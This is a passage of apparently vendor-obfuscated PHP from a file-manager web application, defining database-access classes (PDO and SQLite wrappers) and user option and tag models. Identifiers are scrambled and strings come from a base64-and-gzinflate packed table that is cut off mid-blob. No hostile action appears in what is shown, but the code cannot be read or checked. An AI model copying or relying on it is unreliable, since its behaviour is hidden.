$ò›„Ó‘Ì = array(); if ($¥¥ã³) { foreach ($¥¥ã³ as $®ß­İˆ› => $ˆèñµ”Ú) { $ò›„Ó‘Ì[$®ß­İˆ›] = current($ˆèñµ”Ú); } } return $ò›„Ó‘Ì; } public function replace($ŠŠ¡ÌôØ, $ëë ì±™ = array()) { $ı¤úÏ·¡ =& $_SERVER[è¶³ÒßÑ]; foreach ($ŠŠ¡ÌôØ as $Ä¨˜š§ => $œš €û†) { $¶Äî€† = $this->parseValue($œš €û†); if (is_scalar($¶Äî€†)) { $²Ï†‚[] = $¶Äî€†; $ò€£çŒ…[] = $this->parseKey($Ä¨˜š§); } } $ºÔØ˜Øì = $ı¤úÏ·¡[955] . $this->parseTable($ëë ì±™[$ı¤úÏ·¡[349]]) . $ı¤úÏ·¡[956] . implode($ı¤úÏ·¡[50], $ò€£çŒ…) . $ı¤úÏ·¡[957] . implode($ı¤úÏ·¡[50], $²Ï†‚) . $ı¤úÏ·¡[958]; return $this->execute($ºÔØ˜Øì); } public function insertAll($üæûŠÎª, $…¹íÕıÖ = array(), $…ÈºÏ­¢ = false) { $­¬”Ô¿ =& $_SERVER[è¶³ÒßÑ]; if (!is_array($üæûŠÎª[0])) { return !1; } $½ÈÊ½Ù = array_keys($üæûŠÎª[0]); $÷øËã« = array(); foreach ($üæûŠÎª as $«Ù¹”¥Ğ) { $‡¡…¬ïè = array(); foreach ($«Ù¹”¥Ğ as $Åä®©âİ => $µğå¡Ëû) { $µğå¡Ëû = $this->parseValue($µğå¡Ëû); if (is_scalar($µğå¡Ëû)) { $‡¡…¬ïè[] = $µğå¡Ëû; } } $÷øËã«[] = $­¬”Ô¿[330] . implode($­¬”Ô¿[50], $‡¡…¬ïè) . $­¬”Ô¿[958]; } array_walk($½ÈÊ½Ù, array($this, $­¬”Ô¿[959])); $½€ÛìÈ = $…ÈºÏ­¢ ? $­¬”Ô¿[960] : $­¬”Ô¿[961]; $’é•¼ªÀ = $½€ÛìÈ . $­¬”Ô¿[962] . $this->parseTable($…¹íÕıÖ[$­¬”Ô¿[349]]) . $­¬”Ô¿[956] . implode($­¬”Ô¿[50], $½ÈÊ½Ù) . $­¬”Ô¿[963] . implode($­¬”Ô¿[50], $÷øËã«); return $this->execute($’é•¼ªÀ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ ˜•‚£Á =& $_SERVER[è¶³ÒßÑ]; $this->error = $this->_linkID->errno . $ ˜•‚£Á[4] . $this->_linkID->error; if ($ ˜•‚£Á[12] != $this->queryStr) { $this->error .= LNG($ ˜•‚£Á[48]) . $this->queryStr; } think_trace($this->error, $ ˜•‚£Á[12], $ ˜•‚£Á[49]); return $this->error; } public function escapeString($ëÛ‰ñƒ›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ëÛ‰ñƒ›); } else { return addslashes($ëÛ‰ñƒ›); } } public function parseKey(&$¢á˜’œî, $¾ ¬µ¸œ = true) { $™…•Ş¡ =& $_SERVER[è¶³ÒßÑ]; if ($¾ ¬µ¸œ) { $¢á˜’œî = $this->parseKeyCheck($¢á˜’œî); } if ($¢á˜’œî != $™…•Ş¡[230] && !preg_match($™…•Ş¡[964], $¢á˜’œî)) { $¢á˜’œî = $™…•Ş¡[454] . trim($¢á˜’œî, $™…•Ş¡[454]) . $™…•Ş¡[454]; } return $¢á˜’œî; } } goto bŒ¶Ûóîâò; f¿İ˜¥é³: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\157\160\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Ëä™™ìà) { $ˆõ•ôÃ÷ =& $_SERVER[è¶³ÒßÑ]; $Îİ¬Íáü = defined($ˆõ•ôÃ÷[2185]) && USER_ID ? USER_ID : $ˆõ•ôÃ÷[12]; return "\x55\163\145\162\x4f\x70\164\x69\157\156\137{$Ëä™™ìà}\x5f" . $Îİ¬Íáü; } protected function filterWhere($³³›ˆ €) { $Ò™‹íÒ» =& $_SERVER[è¶³ÒßÑ]; $³³›ˆ €[$Ò™‹íÒ»[1761]] = defined($Ò™‹íÒ»[2185]) && USER_ID ? USER_ID : $Ò™‹íÒ»[12]; return $³³›ˆ €; } public function cacheRemoveUser($¹ÌÑÈŠ, $ˆ¬Ã¿ª­) { return Cache::remove("\125\x73\145\x72\117\160\x74\151\157\156\x5f{$¹ÌÑÈŠ}\137" . $ˆ¬Ã¿ª­); } protected function optionDefault($Ÿ¡Èò¿Ì = '') { $òøä¼ƒ¤ =& $_SERVER[è¶³ÒßÑ]; if ($Ÿ¡Èò¿Ì == $òøä¼ƒ¤[12]) { return $GLOBALS[$òøä¼ƒ¤[6]][$òøä¼ƒ¤[2485]]; } if ($Ÿ¡Èò¿Ì == $òøä¼ƒ¤[2486]) { return $GLOBALS[$òøä¼ƒ¤[6]][$òøä¼ƒ¤[2487]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\x72\56\164\141\147\114\x69\x73\164"; public $modelType = "\x55\x73\x65\162\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\164\x79\x6c\x65", "\163\x6f\x72\x74"); public function listData($À°”û = false, $Ë”Õƒâí = "\163\157\x72\x74", $è›ÄÀàÀ = false) { return parent::listData($À°”û, $Ë”Õƒâí, $è›ÄÀàÀ); } public function remove($Ö“Ÿ£–¶) { return parent::remove($Ö“Ÿ£–¶); } public function add($ÑØ£‚, $áëÍ …Ù = "\154\141\x62\x65\x6c\x2d\147\162\x65\x79\55\x6e\x6f\x72\155\141\x6c") { $è•˜¤¿ =& $_SERVER[è¶³ÒßÑ]; if ($this->findByName($ÑØ£‚)) { return !1; } $îá±Å¼ = array($è•˜¤¿[487] => $ÑØ£‚, $è•˜¤¿[551] => $áëÍ …Ù, $è•˜¤¿[1963] => $this->getSort($è•˜¤¿[328]) + 1); return parent::insert($îá±Å¼); } public function update($Ò—¿ğ‹‘, $«Åóé¢) { $ï¥¯ Ã¤ =& $_SERVER[è¶³ÒßÑ]; $ıí·àÈÉ = $this->listData($Ò—¿ğ‹‘); $Ïì³ÏËß = $this->findByName($«Åóé¢[$ï¥¯ Ã¤[32]]); if (!$ıí·àÈÉ || $Ïì³ÏËß && $Ïì³ÏËß[$ï¥¯ Ã¤[468]] != $ıí·àÈÉ[$ï¥¯ Ã¤[468]]) { return !1; } return parent::update($Ò—¿ğ‹‘, $«Åóé¢); } public function moveTop($üÉ®ù¯¢) { $°şñä¡´ =& $_SERVER[è¶³ÒßÑ]; $ĞÙ¹Áê = parent::listData(); $ §·•ƒÆ = $this->getSort($°şñä¡´[327]); foreach ($ĞÙ¹Áê as &$Ì•¯é‚Ù) { if ($Ì•¯é‚Ù[$°şñä¡´[468]] == $üÉ®ù¯¢) { $Ì•¯é‚Ù[$°şñä¡´[1983]] = $ §·•ƒÆ; continue; } $Ì•¯é‚Ù[$°şñä¡´[1983]] += 1; } unset($Ì•¯é‚Ù); return parent::resetData($ĞÙ¹Áê); } public function moveBottom($Š¶Ëïó) { $½Úº¾®Ä =& $_SERVER[è¶³ÒßÑ]; $ÖÜÃ¶ª÷ = $this->getSort($½Úº¾®Ä[328]) + 1; return parent::update($Š¶Ëïó, array($½Úº¾®Ä[1983] => $ÖÜÃ¶ª÷)); } public function resetSort($É¼À„Ò) { $»Å’šÑ— =& $_SERVER[è¶³ÒßÑ]; $ÏÌÇ×´« = array(); $É¼À„Ò = is_array($É¼À„Ò) ? $É¼À„Ò : array(); for ($ ÅÛÁöˆ = 0; $ ÅÛÁöˆ < count($É¼À„Ò); $ ÅÛÁöˆ++) { $ÏÌÇ×´«[$É¼À„Ò[$ ÅÛÁöˆ] . $»Å’šÑ—[12]] = $ ÅÛÁöˆ + 1; } $¼Ïø†¹¯ = parent::listData(); foreach ($¼Ïø†¹¯ as &$îæÇ¢İ) { $®‚æúØã = $ÏÌÇ×´«[$îæÇ¢İ[$»Å’šÑ—[468]]]; $îæÇ¢İ[$»Å’šÑ—[1983]] = $®‚æúØã ? $®‚æúØã : $îæÇ¢İ[$»Å’šÑ—[1983]]; } unset($îæÇ¢İ); return parent::resetData($¼Ïø†¹¯); } private function getSort($«ÈÒ¼³Ò) { $Æ³ßÉÁñ =& $_SERVER[è¶³ÒßÑ]; $£›Û€ = parent::listData(); $ùµ˜£‰ù = array_to_keyvalue($£›Û€, $Æ³ßÉÁñ[12], $Æ³ßÉÁñ[1983]); if (!$ùµ˜£‰ù) { $ùµ˜£‰ù = array(0); } $¨öÅØ¢ = $«ÈÒ¼³Ò == $Æ³ßÉÁñ[328] ? max($ùµ˜£‰ù) : min($ùµ˜£‰ù); return intval($¨öÅØ¢); } } goto E‚‡¶¶›Ï; bŒ¶Ûóîâò: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($½ìˆ÷§Ÿ = '') { $ü¦³¾éÊ =& $_SERVER[è¶³ÒßÑ]; if (!class_exists($ü¦³¾éÊ[967])) { think_exception(think_lang($ü¦³¾éÊ[14]) . $ü¦³¾éÊ[968]); } if (!empty($½ìˆ÷§Ÿ)) { $this->config = $½ìˆ÷§Ÿ; if (empty($this->config[$ü¦³¾éÊ[17]])) { $this->config[$ü¦³¾éÊ[17]] = array(); } } } public function connect($Â·®ÊÔä = '', $ğ‡Å€ûÏ = 0) { $ä“õÑ¡¶ =& $_SERVER[è¶³ÒßÑ]; if (!isset($this->linkID[$ğ‡Å€ûÏ])) { if (empty($Â·®ÊÔä)) { $Â·®ÊÔä = $this->config; } $ğÉ°é³Ô = !empty($Â·®ÊÔä[$ä“õÑ¡¶[17]][$ä“õÑ¡¶[18]]) ? $Â·®ÊÔä[$ä“õÑ¡¶[17]][$ä“õÑ¡¶[18]] : $this->pconnect; if ($ğÉ°é³Ô) { $Â·®ÊÔä[$ä“õÑ¡¶[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ğ‡Å€ûÏ] = new PDO($Â·®ÊÔä[$ä“õÑ¡¶[969]], $Â·®ÊÔä[$ä“õÑ¡¶[941]], $Â·®ÊÔä[$ä“õÑ¡¶[942]], $Â·®ÊÔä[$ä“õÑ¡¶[17]]); } catch (PDOException $ıÑàù×Š) { think_exception($ıÑàù×Š->getMessage()); } $this->dbType = $this->_getDsnType($Â·®ÊÔä[$ä“õÑ¡¶[969]]); if (in_array($this->dbType, array($ä“õÑ¡¶[970], $ä“õÑ¡¶[971], $ä“õÑ¡¶[972], $ä“õÑ¡¶[973]))) { think_exception($ä“õÑ¡¶[974] . $this->dbType . $ä“õÑ¡¶[975] . $this->dbType . $ä“õÑ¡¶[976]); } if (!$this->linkID[$ğ‡Å€ûÏ]) { think_exception($ä“õÑ¡¶[977]); } try { $this->linkID[$ğ‡Å€ûÏ]->exec($ä“õÑ¡¶[978] . think_config($ä“õÑ¡¶[944])); } catch (Exception $ıÑàù×Š) { } $this->connected = !0; if (1 != think_config($ä“õÑ¡¶[22])) { unset($this->config); } } return $this->linkID[$ğ‡Å€ûÏ]; } public function free() { $this->PDOStatement = null; } public function query($‡ô¹±ôÈ, $Œ†ïºÀ” = array()) { $Úı°úÆÃ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡ô¹±ôÈ; if (!empty($Œ†ïºÀ”)) { $this->queryStr .= $Úı°úÆÃ[979] . print_r($Œ†ïºÀ”, !0) . $Úı°úÆÃ[980]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Úı°úÆÃ[23], 1); think_status($Úı°úÆÃ[24]); $this->PDOStatement = $this->_linkID->prepare($‡ô¹±ôÈ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ìÓü¯ÌŞ = $this->PDOStatement->execute($Œ†ïºÀ”); $this->debug(); if (!1 === $ìÓü¯ÌŞ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ğ˜—ş°, $ôŸÎ„œ = array()) { $® ßü÷ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ˜—ş°; if (!empty($ôŸÎ„œ)) { $this->queryStr .= $® ßü÷[979] . print_r($ôŸÎ„œ, !0) . $® ßü÷[980]; } $üšˆ©Ì© = !1; if ($this->dbType == $® ßü÷[973]) { if (preg_match($® ßü÷[981], $this->queryStr, $ÊüÑ½ä)) { $this->table = think_config($® ßü÷[982]) . str_ireplace(think_config($® ßü÷[983]), $® ßü÷[447], $ÊüÑ½ä[2]); $üšˆ©Ì© = (bool) $this->query($® ßü÷[984] . strtoupper($this->table) . $® ßü÷[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($® ßü÷[25], 1); think_status($® ßü÷[24]); $this->PDOStatement = $this->_linkID->prepare($ğ˜—ş°); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $üÀ°…†ï = $this->PDOStatement->execute($ôŸÎ„œ); $this->debug(); if (!1 === $üÀ°…†ï) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($üšˆ©Ì© || preg_match($® ßü÷[985], $ğ˜—ş°)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ûåÀõœ“ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ûåÀõœ“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×ä³„™ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$×ä³„™) { $this->error(); return !1; } } return !0; } private function getAll() { $¡¨ó§ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¡¨ó§); return $¡¨ó§; } public function getFields($ßĞ˜â­) { $®”Ğí„¿ =& $_SERVER[è¶³ÒßÑ]; $this->initConnect(!0); if (think_config($®”Ğí„¿[986])) { $ÉæÑïôË = str_replace($®”Ğí„¿[987], $ßĞ˜â­, think_config($®”Ğí„¿[986])); } else { switch ($this->dbType) { case $®”Ğí„¿[970]: case $®”Ğí„¿[988]: $ÉæÑïôË = "\x53\x45\114\x45\103\124\40\x20\x20\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\40\141\x73\x20\47\x4e\141\x6d\x65\47\x2c\x20\40\x20\x64\x61\164\x61\x5f\164\171\160\x65\40\x61\x73\x20\x27\x54\x79\160\x65\x27\x2c\x20\x20\x20\x63\157\154\165\x6d\x6e\137\144\145\x66\141\165\x6c\x74\40\x61\x73\40\x27\104\x65\146\141\165\154\x74\x27\54\x20\40\x20\x69\x73\x5f\x6e\x75\x6c\x6c\x61\142\154\x65\40\141\163\40\x27\x4e\165\154\154\47\xa\11\11\x46\122\x4f\x4d\11\151\x6e\146\157\162\x6d\x61\x74\x69\157\x6e\x5f\163\x63\x68\x65\155\141\x2e\x74\x61\142\154\145\163\x20\101\123\x20\164\xa\x9\11\x4a\117\x49\x4e\11\151\156\146\157\x72\x6d\x61\x74\151\157\156\137\163\x63\150\x65\x6d\x61\x2e\143\x6f\x6c\165\x6d\x6e\163\40\101\123\x20\143\12\x9\11\x4f\x4e\40\40\164\56\x74\141\x62\154\145\x5f\143\x61\x74\141\x6c\x6f\147\40\75\40\x63\x2e\x74\x61\x62\154\145\137\x63\x61\164\x61\154\157\x67\xa\11\11\x41\116\x44\40\x74\x2e\164\x61\142\x6c\x65\x5f\x73\143\150\x65\155\x61\x20\75\x20\x63\x2e\x74\141\x62\154\x65\137\163\x63\150\145\155\x61\12\11\11\101\116\104\x20\164\x2e\164\141\142\154\145\137\x6e\141\155\x65\40\75\40\143\56\164\x61\142\x6c\145\x5f\x6e\x61\155\x65\xa\x9\11\127\x48\x45\x52\x45\x20\40\x20\x74\56\x74\141\142\x6c\145\x5f\x6e\141\x6d\145\x20\75\40\x27{$ßĞ˜â­}\x27"; break; case $®”Ğí„¿[989]: $ÉæÑïôË = $®”Ğí„¿[990] . $ßĞ˜â­ . $®”Ğí„¿[991]; break; case $®”Ğí„¿[971]: case $®”Ğí„¿[973]: $ÉæÑïôË = $®”Ğí„¿[992] . $®”Ğí„¿[993] . $®”Ğí„¿[994] . strtoupper($ßĞ˜â­) . $®”Ğí„¿[995] . strtoupper($ßĞ˜â­) . $®”Ğí„¿[996]; break; case $®”Ğí„¿[997]: $ÉæÑïôË = $®”Ğí„¿[998] . $ßĞ˜â­ . $®”Ğí„¿[999]; break; case $®”Ğí„¿[972]: break; case $®”Ğí„¿[1000]: default: $ÉæÑïôË = $®”Ğí„¿[1001] . ($this->dbType == $®”Ğí„¿[1000] ? "\x60{$ßĞ˜â­}\140" : $ßĞ˜â­); } } $–Ù†€ª = $this->query($ÉæÑïôË); $àÔ‘ˆ¹Ø = array(); if ($–Ù†€ª) { foreach ($–Ù†€ª as $ĞÅ‰ìË => $Õ‡ä«‚¦) { $Õ‡ä«‚¦ = array_change_key_case($Õ‡ä«‚¦); $Õ‡ä«‚¦[$®”Ğí„¿[32]] = isset($Õ‡ä«‚¦[$®”Ğí„¿[32]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[32]] : $®”Ğí„¿[447]; $Õ‡ä«‚¦[$®”Ğí„¿[33]] = isset($Õ‡ä«‚¦[$®”Ğí„¿[33]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[33]] : $®”Ğí„¿[447]; $–­ç–½ª = isset($Õ‡ä«‚¦[$®”Ğí„¿[343]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[343]] : $Õ‡ä«‚¦[$®”Ğí„¿[32]]; $àÔ‘ˆ¹Ø[$–­ç–½ª] = array($®”Ğí„¿[32] => $–­ç–½ª, $®”Ğí„¿[33] => $Õ‡ä«‚¦[$®”Ğí„¿[33]], $®”Ğí„¿[35] => (bool) (isset($Õ‡ä«‚¦[$®”Ğí„¿[116]]) && $Õ‡ä«‚¦[$®”Ğí„¿[116]] === $®”Ğí„¿[12] || isset($Õ‡ä«‚¦[$®”Ğí„¿[35]]) && $Õ‡ä«‚¦[$®”Ğí„¿[35]] === $®”Ğí„¿[12]), $®”Ğí„¿[37] => isset($Õ‡ä«‚¦[$®”Ğí„¿[37]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[37]] : (isset($Õ‡ä«‚¦[$®”Ğí„¿[66]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[66]] : $®”Ğí„¿[447]), $®”Ğí„¿[39] => isset($Õ‡ä«‚¦[$®”Ğí„¿[107]]) ? strtolower($Õ‡ä«‚¦[$®”Ğí„¿[107]]) == $®”Ğí„¿[41] : (isset($Õ‡ä«‚¦[$®”Ğí„¿[67]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[67]] : !1), $®”Ğí„¿[42] => isset($Õ‡ä«‚¦[$®”Ğí„¿[1002]]) ? strtolower($Õ‡ä«‚¦[$®”Ğí„¿[1002]]) == $®”Ğí„¿[44] : (isset($Õ‡ä«‚¦[$®”Ğí„¿[107]]) ? $Õ‡ä«‚¦[$®”Ğí„¿[107]] : !1)); } } return $àÔ‘ˆ¹Ø; } public function getTables($Úš÷Ş¹¸ = '') { $É‹æõüÍ =& $_SERVER[è¶³ÒßÑ]; if (think_config($É‹æõüÍ[1003])) { $¤Ñª®ê = str_replace($É‹æõüÍ[1004], $Úš÷Ş¹¸, think_config($É‹æõüÍ[1003])); } else { switch ($this->dbType) { case $É‹æõüÍ[971]: case $É‹æõüÍ[973]: $¤Ñª®ê = $É‹æõüÍ[1005]; break; case $É‹æõüÍ[970]: case $É‹æõüÍ[988]: $¤Ñª®ê = $É‹æõüÍ[1006]; break; case $É‹æõüÍ[997]: $¤Ñª®ê = $É‹æõüÍ[1007]; break; case $É‹æõüÍ[972]: think_exception(think_lang($É‹æõüÍ[1008]) . $É‹æõüÍ[1009]); break; case $É‹æõüÍ[989]: $¤Ñª®ê = $É‹æõüÍ[45] . $É‹æõüÍ[46] . $É‹æõüÍ[47]; break; case $É‹æõüÍ[1000]: default: if (!empty($Úš÷Ş¹¸)) { $¤Ñª®ê = $É‹æõüÍ[952] . $Úš÷Ş¹¸ . $É‹æõüÍ[953]; } else { $¤Ñª®ê = $É‹æõüÍ[954]; } } } $Ãı½×ˆÓ = $this->query($¤Ñª®ê); $úéÓ†Š² = array(); foreach ($Ãı½×ˆÓ as $“µò€óÖ => $Ê¾“Õ‹°) { $úéÓ†Š²[$“µò€óÖ] = current($Ê¾“Õ‹°); } return $úéÓ†Š²; } protected function parseLimit($«ì©¤Îü) { $œ¿Á­¶ =& $_SERVER[è¶³ÒßÑ]; $ö®èÆÄü = $œ¿Á­¶[12]; if (!empty($«ì©¤Îü)) { switch ($this->dbType) { case $œ¿Á­¶[997]: case $œ¿Á­¶[989]: $«ì©¤Îü = explode($œ¿Á­¶[50], $«ì©¤Îü); if (count($«ì©¤Îü) > 1) { $ö®èÆÄü .= $œ¿Á­¶[51] . $«ì©¤Îü[1] . $œ¿Á­¶[52] . $«ì©¤Îü[0] . $œ¿Á­¶[53]; } else { $ö®èÆÄü .= $œ¿Á­¶[51] . $«ì©¤Îü[0] . $œ¿Á­¶[53]; } break; case $œ¿Á­¶[970]: case $œ¿Á­¶[988]: break; case $œ¿Á­¶[972]: break; case $œ¿Á­¶[971]: case $œ¿Á­¶[973]: break; case $œ¿Á­¶[1000]: default: $ö®èÆÄü .= $œ¿Á­¶[51] . $«ì©¤Îü . $œ¿Á­¶[53]; } } return $ö®èÆÄü; } public function parseKey(&$³½¨¬°, $‹ÄÓÄæÑ = true) { $ÖêˆƒÖ =& $_SERVER[è¶³ÒßÑ]; if ($‹ÄÓÄæÑ) { $³½¨¬° = $this->parseKeyCheck($³½¨¬°); } if ($this->dbType == $ÖêˆƒÖ[1000]) { if ($³½¨¬° != $ÖêˆƒÖ[230] && !preg_match($ÖêˆƒÖ[964], $³½¨¬°)) { $³½¨¬° = $ÖêˆƒÖ[454] . trim($³½¨¬°, $ÖêˆƒÖ[454]) . $ÖêˆƒÖ[454]; } return $³½¨¬°; } else { return parent::parseKey($³½¨¬°, $‹ÄÓÄæÑ); } } public function close() { $this->_linkID = null; } public function error() { $àÌãÆãĞ =& $_SERVER[è¶³ÒßÑ]; if ($this->PDOStatement) { $ã¯ñ¤ÓË = $this->PDOStatement->errorInfo(); $this->error = $ã¯ñ¤ÓË[1] . $àÌãÆãĞ[4] . $ã¯ñ¤ÓË[2]; } else { $this->error = $àÌãÆãĞ[12]; } if ($àÌãÆãĞ[12] != $this->queryStr) { $this->error .= LNG($àÌãÆãĞ[48]) . $this->queryStr; } think_trace($this->error, $àÌãÆãĞ[12], $àÌãÆãĞ[49]); return $this->error; } public function escapeString($Ò—î÷¢©) { $¼Á¼¢› =& $_SERVER[è¶³ÒßÑ]; switch ($this->dbType) { case $¼Á¼¢›[997]: case $¼Á¼¢›[970]: case $¼Á¼¢›[988]: case $¼Á¼¢›[1000]: return addslashes($Ò—î÷¢©); case $¼Á¼¢›[972]: case $¼Á¼¢›[989]: case $¼Á¼¢›[971]: case $¼Á¼¢›[973]: return str_ireplace($¼Á¼¢›[68], $¼Á¼¢›[69], $Ò—î÷¢©); } } protected function parseValue($œñ¤ş·) { $í„¦ƒ–ì =& $_SERVER[è¶³ÒßÑ]; if (is_string($œñ¤ş·)) { $À”©ªÌ¤ = strpos($œñ¤ş·, $í„¦ƒ–ì[4]) === 0 && in_array($œñ¤ş·, array_keys($this->bind)); $œñ¤ş· = $À”©ªÌ¤ ? $this->escapeString($œñ¤ş·) : $í„¦ƒ–ì[1010] . $this->escapeString($œñ¤ş·) . $í„¦ƒ–ì[1010]; } elseif (isset($œñ¤ş·[0]) && is_string($œñ¤ş·[0]) && strtolower($œñ¤ş·[0]) == $í„¦ƒ–ì[366]) { $œñ¤ş· = $this->escapeString($œñ¤ş·[1]); } elseif (is_array($œñ¤ş·)) { $œñ¤ş· = array_map(array($this, $í„¦ƒ–ì[1011]), $œñ¤ş·); } elseif (is_bool($œñ¤ş·)) { $œñ¤ş· = $œñ¤ş· ? $í„¦ƒ–ì[101] : $í„¦ƒ–ì[238]; } elseif (is_null($œñ¤ş·)) { $œñ¤ş· = $í„¦ƒ–ì[116]; } return $œñ¤ş·; } public function getLastInsertId() { $´Ø¤ÌË¢ =& $_SERVER[è¶³ÒßÑ]; switch ($this->dbType) { case $´Ø¤ÌË¢[997]: case $´Ø¤ÌË¢[989]: case $´Ø¤ÌË¢[970]: case $´Ø¤ÌË¢[988]: case $´Ø¤ÌË¢[972]: case $´Ø¤ÌË¢[1000]: return $this->_linkID->lastInsertId(); case $´Ø¤ÌË¢[971]: case $´Ø¤ÌË¢[973]: $…†ÌßÇ´ = $this->table; $²×øÇ“Ó = $this->query("\x53\105\x4c\105\103\x54\x20{$…†ÌßÇ´}\x2e\x63\x75\x72\x72\166\x61\154\40\143\x75\162\162\x76\141\154\40\x46\x52\117\x4d\40\x64\x75\x61\154"); return $²×øÇ“Ó ? $²×øÇ“Ó[0][$´Ø¤ÌË¢[1012]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($²ÅÄ˜™ı) { $İÙ€­”ú =& $_SERVER[è¶³ÒßÑ]; if (!CacheLock::fileLock($İÙ€­”ú[13])) { return !1; } $É†ÑÂğ = parent::query($²ÅÄ˜™ı); CacheLock::fileUnLock($İÙ€­”ú[13]); return $É†ÑÂğ; } public function execute($ğ¼Ú¡åè) { $‘©ËØÒ€ =& $_SERVER[è¶³ÒßÑ]; if (!CacheLock::fileLock($‘©ËØÒ€[13])) { return !1; } $ãÙ¾ÁÏ = parent::execute($ğ¼Ú¡åè); CacheLock::fileUnLock($‘©ËØÒ€[13]); return $ãÙ¾ÁÏ; } } class DbSqlite3 extends DbSqlite3Base { public function query($š‚şÁ×±) { $ƒçÉÓïÕ =& $_SERVER[è¶³ÒßÑ]; if (!CacheLock::fileLock($ƒçÉÓïÕ[13])) { return !1; } $ğõ®“º¤ = parent::query($š‚şÁ×±); CacheLock::fileUnLock($ƒçÉÓïÕ[13]); return $ğõ®“º¤; } public function execute($º½Ê¹) { $“«•Î¼è =& $_SERVER[è¶³ÒßÑ]; if (!CacheLock::fileLock($“«•Î¼è[13])) { return !1; } $ƒÚ‘¿—õ = parent::execute($º½Ê¹); CacheLock::fileUnLock($“«•Î¼è[13]); return $ƒÚ‘¿—õ; } } goto cÇ‰ç˜Ø¶Ø; A µ›ŸËÎÍ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\350\266\263\322\337\321", "\262\336\325\217\363\212"); $_SERVER[è¶³ÒßÑ] = explode("\x7c\x2\x7c\x1\x7c\x6", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXwbxfUwVyEBWii09KDAxiTYTnTYzokTJ8iybCuRLSPJObDNZiWt7Q==').base64_decode('jSWtol35yMGREgKEECjhbKDcZ0LCfSXQcjSchf5LKbSF0hIngUJpKaUcLf3meHPsSoZ+vw==')."\xff\xf7\xfb\x7d\x81\x44\x73\xbc\x99\x9d\xe3\xcd\x7b\x6f\xde\xbc\x79\xf3\xd6\x6f\x5f\x78\xf7\xbe\x37\x56\x1d\xb0\x6a\xff\x55\x7\xaf\x7d\xf9\x89\x67\xd7\x5e\x4d\xc3\xe8\x2f\xfe\x8f\x84\x4f\x58\x3f\x6e\x3f\xf2".strrev('£úzÁi ^šnÓ¸ß¿÷6GÜô‰Âõ¼¯Í…ïºO³ôªÛïáûJt8ÎµUTõèç').base64_decode('5Exb0YcNy7ZoQsrM9Rp9NGzk6K+f/nTGIgU9a9o6jfrojwqNIv9ayzMGy1fbowk13tnREQ==')."\212\45\0\250\136\316\317\232\151\10\345\265\202\226\205\357\347\365\202\205\132\43\127\247\346\315\274\236\163\244\210\204\264\146\153\111\315\202\232\232\32\325\246\120\107\44\272\104\115\54\351\10"."\x1\x44\x52\x5d\x5e\xd4\xb\x23\x34\x46\x82\x71\x5b\x2b\xd8\x9\x23\xab\x73\x88\xa1\x2\x6f\x57\x63\xa8\x25\xdc\xae\x24\x62\x81\xf6\x78\x20\x98\x8\x47\xdb\x69\x72\x30\xda\xd6\x16\x4e\x94\xa6\xc7\xa2\x91\x48".base64_decode('YyC4oDSnIxZoaQsoqH0ZXTVyvWaVspTmLFWqaaDZ0DNpGsxprDn2SB5CCR5C05QrZjI00g==')."\316\103\151\275\127\53\146\140\264\232\344\110\276\140\144\65\326\351\5\372\10\117\245\1\255\150\233\106\56\105\43\241\141\273\240\211\164\324\326\24\232\150\75\7\125\305\103\221\120\60\241\340"."\x6\x2a\xcd\xb1\x68\x9b\x2\x93\x90\xd5\x2c\x5b\x2f\x28\x8b\x5a\x43\xb1\x90\x82\x1b\xdd\x50\x49\xfa\x5a\xa9\x0\xbe\xb4\xa3\xa1\x50\x2\x91\x88\x32\x56\xd\xb6\x9e\xcd\xb3\x6a\x68\x99\x32\x95\x45\x63\x4d\xa1"."\230\322\270\104\21\43\224\62\263\131\63\347\103\265\240\231\264\245\246\206\142\61\32\360\0\172\107\302\170\322\40\22\155\156\216\207\170\14\260\124\353\65\62\120\55\16\131\306\12\135\316\211"."\243\170\70\47\362\325\76\335\126\321\42\261\321\67\1\145\33\3\361\160\120\355\10\44\132\141\14\363\171\277\225\36\260\374\132\41\325\157\14\352\21\43\351\117\32\71\77\106\125\137\222\55".base64_decode('qk